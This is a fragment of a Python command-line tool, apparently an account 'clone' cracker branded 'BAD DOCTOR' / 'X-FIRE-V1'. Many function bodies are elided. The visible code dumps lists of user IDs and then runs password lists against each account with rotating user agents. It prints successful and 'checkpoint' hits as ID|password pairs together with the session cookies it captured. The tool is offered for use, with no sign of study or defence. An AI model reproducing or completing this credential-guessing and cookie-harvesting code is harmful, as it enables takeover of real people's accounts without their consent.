...
\x1b[1;92m                  TOOL - BAD DOCTOR V1.0
\033[1;34m-------------------------------------------------
\033[1;32m[•] Author   : Doctor
\033[1;31m[•] My Bro : Lala
\033[1;34m[•] Tool Name : X-FIRE-V1

                \033[1;30m[THIS TOOL CREAT BY DOCTOR]

\033[1;36m-------------------------------------------------
             """,width=60,title=f"DOCTOR-404",style=f"bold green"))
#--------------------[ BAGIAN-MASUK ]--------------#
def login123():
	os.system('clear')
	banner()
	cetak(panel(f"\033[1;36m└\033[1;32m[1] [PUBLIC ID ]     [2] [FILE CLONE]",width=90,title=f"[bold green]",padding=(0,2),style=f"bold white"))
...
def menu(my_name,my_id):
	...
	_____brayennn___xd____ = input(f'\033[1;36m└[CHOOSE] : ')
...
def brayen_dump():
	...
	try:
		...
		print('')
		print(f'\033[1;36m└\033[1;32m[ALL IDS]: {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
...
def dump_massal():
	...
	for userr in uid:
		try:
			...
			exit()
	try:
		print(f'\033[1;36m└[ALL IDS] : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		#print(' ╰─  Unstable Signal ')
...
def cracker(idf,pwv):
	...
	ses = requests.Session()
	prog.update(des,description=f"{h}DOCTOR{x} {loop}/{len(id)} LIVE • [bold green]{ok}[/] CHECK • [bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"DOCTOR-CP [bold red]{idf}|{pw}")
				tree.add(f"DOCTOR-CP [bold red]{kuki}\n")
				cetak(tree)
				...
				tree = Tree(f"  ")
				tree.add(f"DOCTOR-OK [bold green]{idf}|{pw}")
				tree.add(f"DOCTOR-OK [bold green]{kuki}\n")
				cetak(tree)
...
def crack(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}DOCTOR{x} {loop}/{len(id)} LIVE • [bold green]{ok}[/] CP • [bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
...
def crackfree(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}HAMA{x} {loop}/{len(id)} LIVE • [bold green]{ok}[/] CP • [bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
